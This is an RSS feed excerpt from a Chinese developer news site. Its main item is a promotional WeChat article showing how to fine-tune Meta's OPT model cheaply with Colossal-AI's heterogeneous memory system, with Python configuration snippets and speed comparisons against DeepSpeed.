<?xml version="1.0" encoding="UTF-8"?>
        <rss version="2.0" xmlns:content="http://purl.org/rss/1.0/modules/content/">
            <channel>
            <title>开发者头条</title>
            <link>http://toutiao.io/</link>
            <description></description>
<item>
<guid>8815daf387c3e58251bc365cc64b8584</guid>
<title>为什么我饿了么技术总监不干，却要从事自由职业？</title>
<link>https://toutiao.io/k/hpupzay</link>
<content:encoded>&lt;div&gt;&lt;div&gt;&lt;div class=&quot;profile_inner&quot;&gt;
                  &lt;strong class=&quot;profile_nickname&quot;&gt;叶小钗&lt;/strong&gt;
                  &lt;img class=&quot;profile_avatar&quot; id=&quot;js_profile_qrcode_img&quot; src=&quot;&quot; alt=&quot;&quot;/&gt;

                  &lt;p class=&quot;profile_meta&quot;&gt;
                  &lt;label class=&quot;profile_meta_label&quot;&gt;Weixin ID&lt;/label&gt;
                  &lt;span class=&quot;profile_meta_value&quot;&gt;erchonglin&lt;/span&gt;
                  &lt;/p&gt;

                  &lt;p class=&quot;profile_meta&quot;&gt;
                  &lt;label class=&quot;profile_meta_label&quot;&gt;About Feature&lt;/label&gt;
                  &lt;span class=&quot;profile_meta_value&quot;&gt;原为鹅厂、ctrip、baidu、一线开发，B站技术专家，现为一独角兽技术负责人，带200多人团队和1条产品线。公号多由一些感悟组成，核心聚焦团队管理、产品思考、数字化转型、公司治理，偶尔也会扯犊子。&lt;/span&gt;
                  &lt;/p&gt;
                &lt;/div&gt;
                &lt;/div&gt;&lt;/div&gt;</content:encoded>
</item>
<item>
<guid>788abeed720606fc0e401f373bb113a7</guid>
<title>国内竟然也有这种级别的开源项目？万万没想到！</title>
<link>https://toutiao.io/k/dgo2iwb</link>
<content:encoded>&lt;div&gt;&lt;div&gt;&lt;div class=&quot;rich_media_content                                       &quot; id=&quot;js_content&quot;&gt;
            &lt;p class=&quot;js_darkmode__1&quot; data-mpa-powered-by=&quot;yiban.io&quot;&gt;&lt;span&gt;公众号关注 “GitCube”&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;span&gt;设为 “&lt;/span&gt;&lt;span&gt;星标&lt;/span&gt;&lt;span&gt;”，每天带你逛 GitHub！&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;/p&gt;&lt;p&gt;&lt;img class=&quot;rich_pages wxw-img&quot; data-cropselx1=&quot;0&quot; data-cropselx2=&quot;561&quot; data-cropsely1=&quot;0&quot; data-cropsely2=&quot;316&quot; data-galleryid=&quot;&quot; data-ratio=&quot;0.4716666666666667&quot; data-s=&quot;300,640&quot; data-src=&quot;https://mmbiz.qpic.cn/mmbiz_png/uDRkMWLia28hbMDupRt8Y7lJvWy3b3vGMAqicJpkfh5HIJYcibbQr3GSgib2kv3mwrGG9SFA5eibYTyhuHo60Zianm6Q/640?wx_fmt=png&amp;amp;wxfrom=5&amp;amp;wx_lazy=1&amp;amp;wx_co=1&quot; data-type=&quot;jpeg&quot; data-w=&quot;1200&quot;/&gt;&lt;/p&gt;&lt;section&gt;&lt;span md-inline=&quot;plain&quot;&gt;大家好，我是小 G。&lt;/span&gt;&lt;/section&gt;&lt;section&gt;&lt;span md-inline=&quot;plain&quot;&gt;最近两年，大模型已成为 AI 圈的一种潮流，不仅横扫各大性能榜单，更产生了诸多有趣应用。&lt;/span&gt;&lt;/section&gt;&lt;section&gt;&lt;span md-inline=&quot;plain&quot;&gt;例如，微软和 OpenAI 开发的自动代码建议补全神器 Copilot，化身程序员最佳助手，提升工作效率。&lt;/span&gt;&lt;/section&gt;&lt;section&gt;&lt;img class=&quot;rich_pages wxw-img&quot; data-cropselx1=&quot;0&quot; data-cropselx2=&quot;556&quot; data-cropsely1=&quot;0&quot; data-cropsely2=&quot;293&quot; data-ratio=&quot;0.5256147540983607&quot; data-src=&quot;https://mmbiz.qpic.cn/mmbiz_gif/uDRkMWLia28iaPjFBfpNAy7GzuVjrze4ObPN9UVXhhW72ibKAlHlz5JCIAxKe30qxAJy8BsmcMplVKPXtMSBtIia7A/640?wx_fmt=gif&quot; data-w=&quot;976&quot;/&gt;&lt;/section&gt;&lt;section&gt;&lt;span md-inline=&quot;plain&quot;&gt;OpenAI 刚刚发布能以假乱真的文本生成图像模型 DALL-E 2，Google 便紧接着发布了 Imagen，在大模型上，大公司也是相当的卷，丝毫不比 CV 刷榜差。&lt;/span&gt;&lt;/section&gt;&lt;section&gt;&lt;img class=&quot;rich_pages wxw-img&quot; data-cropselx1=&quot;0&quot; data-cropselx2=&quot;561&quot; data-cropsely1=&quot;0&quot; data-cropsely2=&quot;279&quot; data-ratio=&quot;0.49850746268656715&quot; data-src=&quot;https://mmbiz.qpic.cn/mmbiz_png/uDRkMWLia28iaPjFBfpNAy7GzuVjrze4ObJmcNMe2ZNmnEA6HOG98uWNr1x1DFJEWhATHpdXhH0MwyHxEPOXCYXQ/640?wx_fmt=png&quot; data-w=&quot;2680&quot;/&gt;&lt;span&gt;&lt;em&gt;&lt;span&gt;文本到图像生成样例 “一个被猫绊倒的希腊人雕像”（左侧两列为 Imagen，右侧两列为 DALL・E 2）&lt;/span&gt;&lt;/em&gt;&lt;/span&gt;&lt;/section&gt;&lt;section&gt;&lt;span md-inline=&quot;plain&quot;&gt;模型增大带来的神奇表现，使得近几年预训练模型规模呈现爆炸式增长。然而，训练甚至微调大模型都需要非常高的硬件成本，动辄几十、上百张 GPU。&lt;/span&gt;&lt;/section&gt;&lt;section&gt;&lt;span md-inline=&quot;plain&quot;&gt;此外，PyTorch、TensorFlow 等现有深度学习框架也难以有效处理超大模型，通常需要专业的 AI 系统工程师做针对具体模型做适配和优化。&lt;/span&gt;&lt;/section&gt;&lt;section&gt;&lt;span md-inline=&quot;plain&quot;&gt;更重要的是，不是每一个实验室以及研发团队都具备 “钞” 能力，能够随时调用大规模 GPU 集群来使用大模型，更不用提仅有一张显卡的个人开发者。因此，尽管大模型已经吸引了大量关注，高昂的上手门槛却令大众 “望尘莫及”。&lt;/span&gt;&lt;/section&gt;&lt;section&gt;&lt;img class=&quot;rich_pages wxw-img&quot; data-cropselx1=&quot;0&quot; data-cropselx2=&quot;561&quot; data-cropsely1=&quot;0&quot; data-cropsely2=&quot;333&quot; data-ratio=&quot;0.595069107209563&quot; data-src=&quot;https://mmbiz.qpic.cn/mmbiz_png/uDRkMWLia28iaPjFBfpNAy7GzuVjrze4ObBNOoqAIayEFxE32hqA61REWEmLownrQCxL7Rf3et88yxAla1hm535A/640?wx_fmt=png&quot; data-w=&quot;2677&quot;/&gt;&lt;/section&gt;&lt;section&gt;&lt;span md-inline=&quot;plain&quot;&gt;导致大模型使用成本增高的核心原因是显存限制。GPU 计算虽快，但显存容量有限，无法容纳大模型。&lt;/span&gt;&lt;/section&gt;&lt;section&gt;&lt;span md-inline=&quot;plain&quot;&gt;在前不久的文章《&lt;a target=&quot;_blank&quot; href=&quot;http://mp.weixin.qq.com/s?__biz=MzAxOTcxNTIwNQ==&amp;amp;mid=2457973991&amp;amp;idx=1&amp;amp;sn=6f3cc4df50102f799cc6ae5d449de20a&amp;amp;chksm=8cb7d10dbbc0581ba6978eb32e0623c1cddffecf55aea191903527ac067fa2cfc686fd0434f7&amp;amp;scene=21#wechat_redirect&quot; textvalue=&quot;国人主导的开源项目，斩获 3700 个 GitHub Star！&quot; linktype=&quot;text&quot; imgurl=&quot;&quot; imgdata=&quot;null&quot; data-itemshowtype=&quot;0&quot; tab=&quot;innerlink&quot; data-linktype=&quot;2&quot;&gt;国人主导的开源项目，斩获 3700 个 GitHub Star！&lt;/a&gt;》中，我们介绍了 Colossal-AI 最新研发的异构内存系统，它能够高效地同时使用 GPU 显存以及价格低廉的 CPU 内存，&lt;strong&gt;&lt;span md-inline=&quot;plain&quot;&gt;可提升模型容量十余倍，以低成本高效训练 AI 大模型，兼容目前主流的训练任务和优化加速技术，还能便捷扩展至大规模分布式&lt;/span&gt;&lt;/strong&gt;。&lt;/span&gt;&lt;/section&gt;&lt;section&gt;&lt;span md-inline=&quot;plain&quot;&gt;Hugging Face 为深度学习社区提供了超过 5 万个 AI 模型的实现，最其中也不乏像 GPT, OPT 这样的大模型，现已成为最流行的 AI 库之一。&lt;/span&gt;&lt;/section&gt;&lt;p&gt;&lt;img class=&quot;rich_pages wxw-img&quot; data-galleryid=&quot;&quot; data-ratio=&quot;0.41030042918454934&quot; data-s=&quot;300,640&quot; data-src=&quot;https://mmbiz.qpic.cn/mmbiz_png/uDRkMWLia28iaPjFBfpNAy7GzuVjrze4Ob4gh8qfhrJFqv3tibh5amIJRIgRh8wgP5n74xZxFysw97f2rO1H1dZGQ/640?wx_fmt=png&quot; data-type=&quot;png&quot; data-w=&quot;1165&quot;/&gt;&lt;/p&gt;&lt;section&gt;&lt;span md-inline=&quot;plain&quot;&gt;Colossal-AI 无缝支持 Hugging Face 社区模型，让大模型对每一位开发者都变得触手可及。接下来，我们将以 Meta 发布的大模型 OPT 为例，展现如何使用 Colossal-AI，&lt;strong&gt;&lt;span md-inline=&quot;plain&quot;&gt;仅需添加几行代码，便可实现大模型的低成本训练和微调。&lt;/span&gt;&lt;/strong&gt;&lt;/span&gt;&lt;/section&gt;&lt;section&gt;&lt;span md-inline=&quot;plain&quot;&gt;开源地址：&lt;/span&gt;&lt;span&gt;&lt;em&gt;&lt;span md-inline=&quot;url&quot; spellcheck=&quot;false&quot;&gt;https://github.com/hpcaitech/ColossalAI&lt;/span&gt;&lt;/em&gt;&lt;/span&gt;&lt;/section&gt;&lt;h3 cid=&quot;n157&quot; mdtype=&quot;heading&quot;&gt;&lt;span md-inline=&quot;plain&quot;&gt;低成本加速大模型 OPT&lt;/span&gt;&lt;/h3&gt;&lt;section&gt;&lt;span md-inline=&quot;strong&quot;&gt;&lt;strong&gt;&lt;span md-inline=&quot;plain&quot;&gt;OPT 模型&lt;/span&gt;&lt;/strong&gt;&lt;/span&gt;&lt;/section&gt;&lt;section&gt;&lt;span md-inline=&quot;plain&quot;&gt;OPT 的全称为 Open Pretrained Transformer，是 Meta (Facebook) AI 实验室发布的对标 GPT-3 的大规模 Transformer 模型。与 OpenAI 尚未公开模型权重的 GPT-3 相比，Meta AI 慷慨地开源了所有的代码以及模型权重，极大推动了 AI 大模型的民主化，每一位开发者都能以此为基础开发个性化的下游任务。&lt;/span&gt;&lt;/section&gt;&lt;section&gt;&lt;span md-inline=&quot;plain&quot;&gt;接下来，我们将用 Hugging Face 提供的 OPT 模型的预训练权重进行 Casual Language Modelling 的微调。&lt;/span&gt;&lt;/section&gt;&lt;section&gt;&lt;span md-inline=&quot;strong&quot;&gt;&lt;strong&gt;&lt;span md-inline=&quot;plain&quot;&gt;添加配置文件&lt;/span&gt;&lt;/strong&gt;&lt;/span&gt;&lt;/section&gt;&lt;section&gt;&lt;span md-inline=&quot;plain&quot;&gt;想要使用 Colossal-AI 中各个强大功能，用户&lt;strong&gt;&lt;span md-inline=&quot;plain&quot;&gt;无需更改代码训练逻辑，只用添加一个简单的配置文件，即可赋予模型所期望的功能&lt;/span&gt;&lt;/strong&gt;，比如混合精度、梯度累积、多维并行训练、冗余内存优化等。&lt;/span&gt;&lt;/section&gt;&lt;section&gt;&lt;span md-inline=&quot;plain&quot;&gt;在一张 GPU 上，以异构训练为例，我们只需在配置文件里加上相关配置项。其中 tensor_placement_policy 决定了我们异构训练的策略，这个参数可以为 cuda、cpu 以及 auto。各个策略有不同的优点：&lt;/span&gt;&lt;/section&gt;&lt;ul class=&quot;list-paddingleft-1&quot; cid=&quot;n163&quot; mdtype=&quot;list&quot; data-mark=&quot;-&quot;&gt;&lt;li&gt;&lt;p cid=&quot;n227&quot; mdtype=&quot;paragraph&quot;&gt;&lt;span md-inline=&quot;plain&quot;&gt;cuda: 将全部模型参数都放置于 GPU 上，适合不 offload 时仍然能进行训练的传统场景；&lt;/span&gt;&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p cid=&quot;n229&quot; mdtype=&quot;paragraph&quot;&gt;&lt;span md-inline=&quot;plain&quot;&gt;cpu 则会将模型参数都放置在 CPU 内存中，仅在 GPU 显存中保留当前参与计算的权重，适合超大模型的训练；&lt;/span&gt;&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p cid=&quot;n231&quot; mdtype=&quot;paragraph&quot;&gt;&lt;span md-inline=&quot;plain&quot;&gt;auto 则会根据实时的内存信息，自动决定保留在 GPU 显存中的参数量，这样能最大化利用 GPU 显存，同时减少 CPU-GPU 之间的数据传输。&lt;/span&gt;&lt;/p&gt;&lt;/li&gt;&lt;/ul&gt;&lt;section&gt;&lt;span md-inline=&quot;plain&quot;&gt;对于一般用户而言，&lt;strong&gt;&lt;span md-inline=&quot;plain&quot;&gt;仅需选择 auto 策略，由 Colossal-AI 自动化地实时动态选择最佳异构策略，最大化计算效率。&lt;/span&gt;&lt;/strong&gt;&lt;/span&gt;&lt;/section&gt;&lt;pre spellcheck=&quot;false&quot; lang=&quot;python&quot; cid=&quot;n167&quot; mdtype=&quot;fences&quot;&gt;&lt;span role=&quot;presentation&quot;&gt;&lt;span&gt;from&lt;/span&gt; &lt;span&gt;colossalai&lt;/span&gt;.&lt;span&gt;zero&lt;/span&gt;.&lt;span&gt;shard_utils&lt;/span&gt; &lt;span&gt;import&lt;/span&gt; &lt;span&gt;TensorShardStrategy&lt;/span&gt;&lt;/span&gt;&lt;br/&gt;&lt;span role=&quot;presentation&quot;/&gt;&lt;br/&gt;&lt;span role=&quot;presentation&quot;&gt;&lt;span&gt;zero&lt;/span&gt; &lt;span&gt;=&lt;/span&gt; &lt;span&gt;dict&lt;/span&gt;(&lt;span&gt;model_config&lt;/span&gt;&lt;span&gt;=&lt;/span&gt;&lt;span&gt;dict&lt;/span&gt;(&lt;span&gt;shard_strategy&lt;/span&gt;&lt;span&gt;=&lt;/span&gt;&lt;span&gt;TensorShardStrategy&lt;/span&gt;(),&lt;/span&gt;&lt;br/&gt;&lt;span role=&quot;presentation&quot;&gt;                             &lt;span&gt;tensor_placement_policy&lt;/span&gt;&lt;span&gt;=&lt;/span&gt;&lt;span&gt;&quot;auto&quot;&lt;/span&gt;),&lt;/span&gt;&lt;br/&gt;&lt;span role=&quot;presentation&quot;&gt;           &lt;span&gt;optimizer_config&lt;/span&gt;&lt;span&gt;=&lt;/span&gt;&lt;span&gt;dict&lt;/span&gt;(&lt;span&gt;gpu_margin_mem_ratio&lt;/span&gt;&lt;span&gt;=&lt;/span&gt;&lt;span&gt;0.8&lt;/span&gt;))&lt;/span&gt;&lt;/pre&gt;&lt;section&gt;&lt;span md-inline=&quot;strong&quot;&gt;&lt;strong&gt;&lt;span md-inline=&quot;plain&quot;&gt;运行启动&lt;/span&gt;&lt;/strong&gt;&lt;/span&gt;&lt;/section&gt;&lt;section&gt;&lt;span md-inline=&quot;plain&quot;&gt;在配置文件准备好之后，我们&lt;strong&gt;&lt;span md-inline=&quot;plain&quot;&gt;只需插入几行代码即可启动声明的新功能&lt;/span&gt;&lt;/strong&gt;。&lt;/span&gt;&lt;/section&gt;&lt;section&gt;&lt;span md-inline=&quot;plain&quot;&gt;首先，通过一行代码，使用配置文件启动 Colossal-AI，Colossal-AI 会自动初始化分布式环境，并读取相关配置，之后将配置里的功能自动注入到模型以及优化器等组件中。&lt;/span&gt;&lt;/section&gt;&lt;pre spellcheck=&quot;false&quot; cid=&quot;n208&quot; mdtype=&quot;fences&quot;&gt;&lt;pre spellcheck=&quot;false&quot; lang=&quot;python&quot; cid=&quot;n208&quot; mdtype=&quot;fences&quot;&gt;&lt;span role=&quot;presentation&quot;&gt;&lt;span&gt;colossalai&lt;/span&gt;.&lt;span&gt;launch_from_torch&lt;/span&gt;(&lt;span&gt;config&lt;/span&gt;&lt;span&gt;=&lt;/span&gt;&lt;span&gt;&#x27;./configs/colossalai_zero.py&#x27;&lt;/span&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/pre&gt;&lt;section&gt;&lt;span md-inline=&quot;plain&quot;&gt;接下来，用户可以照常定义数据集、模型、优化器、损失函数等，例如直接使用原生 PyTorch 代码。在定义模型时，只需将模型放置于 ZeroInitContext 下初始化即可。&lt;/span&gt;&lt;/section&gt;&lt;section&gt;&lt;span md-inline=&quot;plain&quot;&gt;在例子里，我们使用 Hugging Face 提供的 OPTForCausalLM 模型以及预训练权重，在 Wikitext 数据集上进行微调。&lt;/span&gt;&lt;/section&gt;&lt;pre spellcheck=&quot;false&quot; lang=&quot;python&quot; cid=&quot;n215&quot; mdtype=&quot;fences&quot;&gt;&lt;span role=&quot;presentation&quot;&gt;&lt;span&gt;with&lt;/span&gt; &lt;span&gt;ZeroInitContext&lt;/span&gt;(&lt;span&gt;target_device&lt;/span&gt;&lt;span&gt;=&lt;/span&gt;&lt;span&gt;torch&lt;/span&gt;.&lt;span&gt;cuda&lt;/span&gt;.&lt;span&gt;current_device&lt;/span&gt;(),&lt;/span&gt;&lt;br/&gt;&lt;span role=&quot;presentation&quot;&gt;                   &lt;span&gt;shard_strategy&lt;/span&gt;&lt;span&gt;=&lt;/span&gt;&lt;span&gt;shard_strategy&lt;/span&gt;,&lt;/span&gt;&lt;br/&gt;&lt;span role=&quot;presentation&quot;&gt;                   &lt;span&gt;shard_param&lt;/span&gt;&lt;span&gt;=&lt;/span&gt;&lt;span&gt;True&lt;/span&gt;):&lt;/span&gt;&lt;br/&gt;&lt;span role=&quot;presentation&quot;&gt;   &lt;span&gt;model&lt;/span&gt; &lt;span&gt;=&lt;/span&gt; &lt;span&gt;OPTForCausalLM&lt;/span&gt;.&lt;span&gt;from_pretrained&lt;/span&gt;(&lt;/span&gt;&lt;br/&gt;&lt;span role=&quot;presentation&quot;&gt;               &lt;span&gt;&#x27;facebook/opt-1.3b&#x27;&lt;/span&gt;&lt;/span&gt;&lt;br/&gt;&lt;span role=&quot;presentation&quot;&gt;               &lt;span&gt;config&lt;/span&gt;&lt;span&gt;=&lt;/span&gt;&lt;span&gt;config&lt;/span&gt;&lt;/span&gt;&lt;br/&gt;&lt;span role=&quot;presentation&quot;&gt;          )&lt;/span&gt;&lt;/pre&gt;&lt;section&gt;&lt;span md-inline=&quot;plain&quot;&gt;接着，只需要调用 colossalai.initialize，便可将配置文件里定义的异构内存功能统一注入到训练引擎中，即可启动相应功能。&lt;/span&gt;&lt;/section&gt;&lt;pre spellcheck=&quot;false&quot; lang=&quot;python&quot; cid=&quot;n219&quot; mdtype=&quot;fences&quot;&gt;&lt;span role=&quot;presentation&quot;&gt;&lt;span&gt;engine&lt;/span&gt;, &lt;span&gt;train_dataloader&lt;/span&gt;, &lt;span&gt;eval_dataloader&lt;/span&gt;, &lt;span&gt;lr_scheduler&lt;/span&gt; &lt;span&gt;=&lt;/span&gt; &lt;span&gt;colossalai&lt;/span&gt;.&lt;span&gt;initialize&lt;/span&gt;(&lt;span&gt;model&lt;/span&gt;&lt;span&gt;=&lt;/span&gt;&lt;span&gt;model&lt;/span&gt;,&lt;/span&gt;&lt;br/&gt;&lt;span role=&quot;presentation&quot;&gt;                                                                              &lt;span&gt;optimizer&lt;/span&gt;&lt;span&gt;=&lt;/span&gt;&lt;span&gt;optimizer&lt;/span&gt;,&lt;/span&gt;&lt;br/&gt;&lt;span role=&quot;presentation&quot;&gt;                                                                              &lt;span&gt;criterion&lt;/span&gt;&lt;span&gt;=&lt;/span&gt;&lt;span&gt;criterion&lt;/span&gt;,&lt;/span&gt;&lt;br/&gt;&lt;span role=&quot;presentation&quot;&gt;                                                                              &lt;span&gt;train_dataloader&lt;/span&gt;&lt;span&gt;=&lt;/span&gt;&lt;span&gt;train_dataloader&lt;/span&gt;,&lt;/span&gt;&lt;br/&gt;&lt;span role=&quot;presentation&quot;&gt;                                                                              &lt;span&gt;test_dataloader&lt;/span&gt;&lt;span&gt;=&lt;/span&gt;&lt;span&gt;eval_dataloader&lt;/span&gt;,&lt;/span&gt;&lt;br/&gt;&lt;span role=&quot;presentation&quot;&gt;                                                                              &lt;span&gt;lr_scheduler&lt;/span&gt;&lt;span&gt;=&lt;/span&gt;&lt;span&gt;lr_scheduler&lt;/span&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;h3 cid=&quot;n176&quot; mdtype=&quot;heading&quot;&gt;&lt;span md-inline=&quot;plain&quot;&gt;优势显著&lt;/span&gt;&lt;/h3&gt;&lt;section&gt;&lt;span md-inline=&quot;plain&quot;&gt;在单张 GPU，与微软 DeepSpeed 相比，Colossal-AI 的使用自动化的 auto 策略，在不同的模型规模上相比 DeepSpeed 的 ZeRO Offloading 策略，均体现出显著优势，&lt;strong&gt;&lt;span md-inline=&quot;plain&quot;&gt;最快可实现 40% 的加速&lt;/span&gt;&lt;/strong&gt;。而 PyTorch 等传统深度学习框架，在单张 GPU 上已经无法运行如此大的模型。&lt;/span&gt;&lt;/section&gt;&lt;section&gt;&lt;img class=&quot;rich_pages wxw-img&quot; data-cropselx1=&quot;0&quot; data-cropselx2=&quot;561&quot; data-cropsely1=&quot;0&quot; data-cropsely2=&quot;151&quot; data-ratio=&quot;0.2721474131821403&quot; data-src=&quot;https://mmbiz.qpic.cn/mmbiz_png/uDRkMWLia28iaPjFBfpNAy7GzuVjrze4ObZ4atwHicrrL7NUic6hiascbg0VTQ9CwEf4s268ffYzOhicQhuNzp44LYwg/640?wx_fmt=png&quot; data-w=&quot;4233&quot;/&gt;&lt;/section&gt;&lt;section&gt;&lt;span md-inline=&quot;plain&quot;&gt;对于使用 8 张 GPU 的并行训练，Colossal-AI 仅需在启动命令中添加 - nprocs 8 即可实现！&lt;/span&gt;&lt;/section&gt;&lt;h3 cid=&quot;n180&quot; mdtype=&quot;heading&quot;&gt;&lt;span md-inline=&quot;plain&quot;&gt;背后秘诀&lt;/span&gt;&lt;/h3&gt;&lt;section&gt;&lt;span md-inline=&quot;plain&quot;&gt;如此显著的提升来自于 Colossal-AI 的高效异构内存管理子系统 Gemini。简单的来说，在模型训练时，Gemini 在前面的几个 step 进行预热，收集 PyTorch 动态计算图中的内存消耗信息；在预热结束后，计算一个算子前，利用收集的内存使用记录，Gemini 将预留出这个算子在计算设备上所需的峰值内存，并同时从 GPU 显存里移动一些模型张量到 CPU 内存。&lt;/span&gt;&lt;/section&gt;&lt;section&gt;&lt;img class=&quot;rich_pages wxw-img&quot; data-cropselx1=&quot;0&quot; data-cropselx2=&quot;561&quot; data-cropsely1=&quot;0&quot; data-cropsely2=&quot;217&quot; data-ratio=&quot;0.3875&quot; data-src=&quot;https://mmbiz.qpic.cn/mmbiz_png/uDRkMWLia28iaPjFBfpNAy7GzuVjrze4Ob6u3ZtN2DyTTR5Hs4VQQXedz98VdyVrI0HEicazlia6MYRiaHNaWNJYAxw/640?wx_fmt=png&quot; data-w=&quot;1280&quot;/&gt;&lt;/section&gt;&lt;section&gt;&lt;span md-inline=&quot;plain&quot;&gt;Gemini 内置的内存管理器给每个张量都标记一个状态信息，包括 HOLD、COMPUTE、FREE 等。然后，根据动态查询到的内存使用情况，不断动态转换张量状态、调整张量位置，相比起 DeepSpeed 的 ZeRO Offload 的静态划分，Colossal-AI Gemini 能更高效利用 GPU 显存和 CPU 内存，实现在硬件极其有限的情况下，最大化模型容量和平衡训练速度。&lt;/span&gt;&lt;/section&gt;&lt;section&gt;&lt;img class=&quot;rich_pages wxw-img&quot; data-cropselx1=&quot;0&quot; data-cropselx2=&quot;561&quot; data-cropsely1=&quot;0&quot; data-cropsely2=&quot;316&quot; data-ratio=&quot;0.5627177700348432&quot; data-src=&quot;https://mmbiz.qpic.cn/mmbiz_png/uDRkMWLia28iaPjFBfpNAy7GzuVjrze4ObxCrEb2xCwN3BoreH5eI0CXOzoWaDq6hbOnHV5cQ8HEWLz8lGIrq7Ag/640?wx_fmt=png&quot; data-w=&quot;1148&quot;/&gt;&lt;/section&gt;&lt;section&gt;&lt;span md-inline=&quot;plain&quot;&gt;对于大模型的代表 GPT，使用 Colossal-AI 在搭载 RTX 2060 6GB 的普通游戏笔记本上，也足以训练高达 15 亿参数模型；对于搭载 RTX3090 24GB 的个人电脑，更是可以直接训练 180 亿参数的模型；对于 Tesla V100 等专业计算卡，Colossal-AI 也能显示出显著改善。&lt;/span&gt;&lt;/section&gt;&lt;h3 cid=&quot;n186&quot; mdtype=&quot;heading&quot;&gt;&lt;span md-inline=&quot;plain&quot;&gt;便捷高效并行扩展&lt;/span&gt;&lt;/h3&gt;&lt;section&gt;&lt;span md-inline=&quot;plain&quot;&gt;想要以最短时间训练当今世界最大最前沿的 AI 模型，仍离不开高效的分布式并行扩展。对于同时使用数据并行、流水并行、2.5 维张量并行等&lt;strong&gt;&lt;span md-inline=&quot;plain&quot;&gt;复杂并行策略，仅需简单声明，即可自动实现&lt;/span&gt;&lt;/strong&gt;，Colossal-AI 无需像其他系统和框架侵入代码，手动处理复杂的底层逻辑。&lt;/span&gt;&lt;/section&gt;&lt;pre spellcheck=&quot;false&quot; lang=&quot;python&quot; cid=&quot;n188&quot; mdtype=&quot;fences&quot;&gt;&lt;span role=&quot;presentation&quot;&gt;&lt;span&gt;parallel&lt;/span&gt; &lt;span&gt;=&lt;/span&gt; &lt;span&gt;dict&lt;/span&gt;(&lt;/span&gt;&lt;br/&gt;&lt;span role=&quot;presentation&quot;&gt;   &lt;span&gt;pipeline&lt;/span&gt;&lt;span&gt;=&lt;/span&gt;&lt;span&gt;2&lt;/span&gt;,&lt;/span&gt;&lt;br/&gt;&lt;span role=&quot;presentation&quot;&gt;   &lt;span&gt;tensor&lt;/span&gt;&lt;span&gt;=&lt;/span&gt;&lt;span&gt;dict&lt;/span&gt;(&lt;span&gt;mode&lt;/span&gt;&lt;span&gt;=&lt;/span&gt;&lt;span&gt;&#x27;2.5d&#x27;&lt;/span&gt;, &lt;span&gt;depth&lt;/span&gt; &lt;span&gt;=&lt;/span&gt; &lt;span&gt;1&lt;/span&gt;, &lt;span&gt;size&lt;/span&gt;&lt;span&gt;=&lt;/span&gt;&lt;span&gt;4&lt;/span&gt;)&lt;/span&gt;&lt;br/&gt;&lt;span role=&quot;presentation&quot;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;section&gt;&lt;span md-inline=&quot;plain&quot;&gt;在面对扩展至数十甚至数百张 GPU 的大规模并行场景时，相比英伟达 Megatron-LM 等现有系统，Colossal-AI 在性能上仍显示出显著的加速性能和资源节约。这意味着对于&lt;strong&gt;&lt;span md-inline=&quot;plain&quot;&gt;预训练 GPT-3 等超大 AI 模型，可节省数百万元的训练费用。&lt;/span&gt;&lt;/strong&gt;&lt;/span&gt;&lt;/section&gt;&lt;section&gt;&lt;span md-inline=&quot;image&quot; data-src=&quot;https://mmbiz.qlogo.cn/mmbiz_png/uDRkMWLia28iaPjFBfpNAy7GzuVjrze4Obf2z0r6kO2awIZwFk1MegpOsOh4Yop5bfanVSWQichkO7wcAoXEHnBvw/0?wx_fmt=png&quot;&gt;&lt;img class=&quot;rich_pages wxw-img&quot; data-cropselx1=&quot;0&quot; data-cropselx2=&quot;561&quot; data-cropsely1=&quot;0&quot; data-cropsely2=&quot;154&quot; data-ratio=&quot;0.2767195767195767&quot; data-src=&quot;https://mmbiz.qpic.cn/mmbiz_png/uDRkMWLia28iaPjFBfpNAy7GzuVjrze4ObJUDZNWWhaYsIKPAu0Zlb04XGmiat7fuIuQQsZwkfP2C4zMfcLkY9zFQ/640?wx_fmt=png&quot; data-w=&quot;1890&quot;/&gt;&lt;/span&gt;&lt;/section&gt;&lt;section&gt;&lt;span md-inline=&quot;plain&quot;&gt;Colossal-AI 相关解决方案已成功在&lt;strong&gt;&lt;span md-inline=&quot;plain&quot;&gt;自动驾驶、云计算、零售、医药、芯片&lt;/span&gt;&lt;/strong&gt;等行业知名厂商落地应用，广受好评。&lt;/span&gt;&lt;/section&gt;&lt;section&gt;&lt;span md-inline=&quot;plain&quot;&gt;Colossal-AI 注重开源社区建设，提供中文教程，开放用户社群及论坛，对于用户反馈进行高效交流与迭代更新，不断添加 PaLM、AlphaFold 等前沿应用。&lt;/span&gt;&lt;/section&gt;&lt;section&gt;&lt;span md-inline=&quot;plain&quot;&gt;自然开源以来，Colossal-AI 已经&lt;strong&gt;&lt;span md-inline=&quot;plain&quot;&gt;多次在 GitHub 及 Papers With Code 热榜位列世界第一&lt;/span&gt;&lt;/strong&gt;，与众多已有数万 star 的明星开源项目一起受到海内外关注！&lt;/span&gt;&lt;/section&gt;&lt;section&gt;&lt;span md-inline=&quot;strong&quot;&gt;&lt;strong&gt;&lt;span md-inline=&quot;plain&quot;&gt;传送门&lt;/span&gt;&lt;/strong&gt;&lt;/span&gt;&lt;/section&gt;&lt;section&gt;&lt;span md-inline=&quot;plain&quot;&gt;GitHub：&lt;/span&gt;&lt;span&gt;&lt;em&gt;&lt;span&gt;https://github.com/hpcaitech/ColossalAI&lt;/span&gt;&lt;/em&gt;&lt;/span&gt;&lt;/section&gt;&lt;section&gt;&lt;em&gt;&lt;span&gt;参考文献：&lt;/span&gt;&lt;/em&gt;&lt;/section&gt;&lt;ul class=&quot;list-paddingleft-1&quot; cid=&quot;n200&quot; mdtype=&quot;list&quot; data-mark=&quot;-&quot;&gt;&lt;li&gt;&lt;p cid=&quot;n367&quot; mdtype=&quot;paragraph&quot;&gt;&lt;em&gt;&lt;span&gt;https://arxiv.org/abs/2202.05924v2&lt;/span&gt;&lt;/em&gt;&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p cid=&quot;n368&quot; mdtype=&quot;paragraph&quot;&gt;&lt;em&gt;&lt;span&gt;https://arxiv.org/abs/2205.11487&lt;/span&gt;&lt;/em&gt;&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p cid=&quot;n371&quot; 